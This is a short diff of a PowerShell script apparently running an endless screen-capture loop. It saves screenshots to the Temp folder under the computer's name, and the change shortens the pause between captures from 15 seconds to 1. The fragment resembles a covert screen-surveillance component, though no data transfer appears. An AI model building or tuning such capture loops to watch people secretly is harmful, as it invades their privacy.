@@ -23,7 +23,7 @@ while(1){
   $graphics.Dispose()
   $bmp.Dispose()
   
-  start-sleep -Seconds 15
+  start-sleep -Seconds 1
 
    try { $ffp = Join-Path -Path $env:USERPROFILE -ChildPath '\AppData\Local\Temp\' + $env:computername + '-Capture.png' } catch {}
     if (Test-Path $ffp) {
